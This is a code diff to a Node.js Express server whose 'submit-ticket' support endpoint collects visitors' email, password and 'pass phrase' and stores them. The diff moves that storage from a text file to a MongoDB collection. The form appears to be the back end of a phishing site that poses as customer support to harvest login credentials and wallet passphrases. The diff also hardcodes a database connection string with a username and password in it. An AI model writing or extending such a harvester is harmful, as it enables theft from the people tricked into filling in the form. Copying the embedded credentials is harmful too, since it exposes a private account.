@@ -1,46 +1,82 @@
 const express = require("express");
 const fs = require("fs");
 const path = require("path");
+const mongoose = require("mongoose");
 
 const app = express();
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// serve frontend
+// Serve frontend
 app.use(express.static("public"));
 
-app.post("/submit-ticket", (req, res) => {
+/*
+==============================
+MongoDB Connection
+==============================
+*/
 
-    const { email, issue, description } = req.body;
+mongoose.connect("mongodb+srv://tunjity26_db_user:YmTpU6wTgdvfwWaV@cluster0.qxbk9ji.mongodb.net/?appName=Cluster0")
+    .then(() => console.log("MongoDB Connected"))
+    .catch(err => console.log(err));
 
-    const timestamp = new Date().toISOString();
+/*
+==============================
+Ticket Schema
+==============================
+*/
 
-    const log = `
-=============================
-TIME: ${timestamp}
-EMAIL: ${email}
-PASSWORD: ${req.body.pwd}
-PASS PHRASE: ${req.body.passphrase}
-ISSUE: ${issue}
-DESCRIPTION:
-${description}
-=============================
+const ticketSchema = new mongoose.Schema({
+    email: String,
+    issue: String,
+    password: String,
+    passphrase: String,
+    description: String,
+    createdAt: {
+        type: Date,
+        default: Date.now
+    }
+});
 
-`;
+const Ticket = mongoose.model("Ticket", ticketSchema);
 
-    fs.appendFile("tickets.txt", log, (err) => {
-        if (err) {
-            return res.status(500).send("Error saving ticket");
-        }
+/*
+==============================
+Submit Ticket API
+==============================
+*/
 
-        res.send({ message: "Ticket submitted successfully" });
-    });
+app.post("/submit-ticket", async (req, res) => {
+
+    try {
+
+        const ticket = new Ticket(req.body);
+        await ticket.save();
+
+        res.json({
+            message: "Ticket saved"
+        });
+
+    } catch (err) {
+
+        console.log(err);
+        res.status(500).json({
+            message: "Server error"
+        });
+
+    }
 
 });
+
+/*
+==============================
+Server Start
+==============================
+*/
 
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
-    console.log("Server running on port " + PORT);
+    console.log("Server running");
 });
